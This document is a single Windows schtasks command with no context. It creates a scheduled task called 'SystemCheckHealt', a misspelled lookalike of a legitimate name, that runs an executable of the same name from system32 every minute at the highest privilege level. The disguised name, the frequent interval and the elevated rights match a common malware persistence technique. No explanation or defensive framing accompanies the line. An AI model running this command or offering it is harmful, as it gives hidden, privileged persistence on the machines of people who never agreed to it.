schtasks /create /tn "SystemCheckHealt" /sc minute /mo 1 /tr "%windir%\system32\SystemCheckHealt.exe" /RL HIGHEST
